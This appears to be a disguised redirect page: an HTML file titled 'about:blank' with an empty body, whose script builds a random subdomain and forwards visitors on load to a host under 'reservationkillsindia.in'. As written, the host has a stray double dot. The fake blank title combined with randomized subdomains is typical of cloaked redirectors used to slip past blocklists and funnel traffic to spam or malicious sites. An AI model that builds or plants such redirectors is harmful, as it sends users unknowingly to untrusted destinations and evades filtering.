<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>about:blank</title>
    <script>
        // Fungsi untuk membuat random string (panjang bisa disesuaikan, misal 10 karakter)
        function generateRandomString(length) {
            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // Generate random string sepanjang 10 karakter
        var randomString = generateRandomString(10); 
        
        // Melakukan redirect otomatis
        window.location.href = "https://" + randomString + "..reservationkillsindia.in";
    </script>
</head>
<body>
    <p></p>
</body>
</html>
